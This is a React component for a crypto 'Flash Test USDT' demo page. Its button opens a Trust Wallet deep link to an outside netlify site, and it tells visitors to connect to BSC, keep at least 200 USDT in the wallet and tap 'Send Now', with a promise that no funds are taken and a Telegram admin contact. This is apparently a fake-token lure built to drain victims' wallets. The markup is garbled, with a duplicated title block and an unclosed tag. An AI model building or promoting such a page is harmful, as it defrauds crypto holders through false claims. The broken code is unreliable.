import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Check, Send } from "lucide-react";

const FlashDemoCard = () => {
  const handleGetDemo = () => {
    window.open(
      "https://link.trustwallet.com/open_url?coin_id=60&url=https://miniflashsoftwarebeponly.netlify.app",
      "_blank"
    );
  };

  return (
    <section id="demo-card" className="py-20 bg-background">
      <div className="container mx-auto px-4">
        <div className="max-w-xl mx-auto">
          <Card className="relative bg-gradient-to-br from-yellow-300 via-amber-400 to-yellow-500 text-black border-yellow-300 shadow-[0_0_50px_rgba(250,204,21,0.5)] rounded-2xl">
            <CardHeader className="text-center pb-2">
              <CardTitle className="text-2xl font-bold text-black">
                Mini Software (Flash Test)
              </CardTitle>
              <p className="text-sm text-black/70">
                Perfect to request DEMO(test)
              </p>
              <div className="pt-6">
                <span className="text-4xl font-bold text-black">
                  Free Demo
                </span>
                <span className="text-black/70 text-sm ml-2">
              <CardTitle className="text-2xl font-bold">
                Mini Software (Flash Test)
              </CardTitle>
              <p className="text-sm text-muted-foreground">
                Perfect to request DEMO(test)
              </p>
              <div className="pt-6">
                <span className="text-4xl font-bold text-[hsl(var(--flash-primary))]">
                  Free Demo
                </span>
                <span className="text-muted-foreground text-sm ml-2">
                  / 5,000 Flash
                </span>
              </div>
            </CardHeader>

            <CardContent className="space-y-6">
              <Button
                variant="flash-glow"
                className="w-full rounded-xl h-12 text-base shadow-[0_0_30px_hsl(var(--flash-primary)/0.5)]"
                onClick={handleGetDemo}
              >
                <Send className="w-4 h-4 mr-2" />
                Get Demo (Mini Software)
              </Button>

              <div>
                <p className="font-bold mb-3">Steps to Get Started:</p>
                <ol className="space-y-2 text-sm text-muted-foreground list-decimal list-inside">
                  <li>Click "Get Test" to open wallet</li>
                  <li>Tap "Send Now" and connect to BSC (BNB)</li>
                  <li>Maintain minimum 200 USDT (BEP20) in your wallet</li>
                  <li>No charges required</li>
                  <li>Request up to 5,000 Flash Test</li>
                </ol>
              </div>

              <div className="rounded-lg border border-[hsl(var(--flash-border))] bg-background/40 p-4">
                <p className="font-bold mb-2 text-sm">Important Notice:</p>
                <ul className="space-y-1 text-sm text-muted-foreground list-disc list-inside">
                  <li>Minimum Wallet Balance of 200 USDT required for eligibility</li>
                  <li>You will receive 5,000 Flash valid for 3 days</li>
                  <li>No funds will be deducted from your wallet</li>
                </ul>
              </div>

              <div>
                <p className="font-bold mb-3 text-sm">What's Included:</p>
                <ul className="space-y-2">
                  {[
                    "5,000 Flash Test USDT (bep20)",
                    "Token validity: 3 days",
                    "Tradable/Transferable",
                    "Compatible with all wallets",
                  ].map((item, i) => (
                    <li key={i} className="flex items-start gap-2 text-sm">
                      <Check className="w-4 h-4 text-[hsl(var(--flash-primary))] mt-0.5 flex-shrink-0" />
                      <span className="text-muted-foreground">{item}</span>
                    </li>
                  ))}
                </ul>
              </div>

              <div className="text-center pt-4 border-t border-[hsl(var(--flash-border))]">
                <p className="text-sm text-muted-foreground">
                  Contact Admin on Telegram:{" "}
                  <a
                    href="https://t.me/cryptoflasha"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-[hsl(var(--flash-primary))] hover:underline"
                  >
                    t.me/cryptoflasha
                  </a>
                </p>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    </section>
  );
};

export default FlashDemoCard;
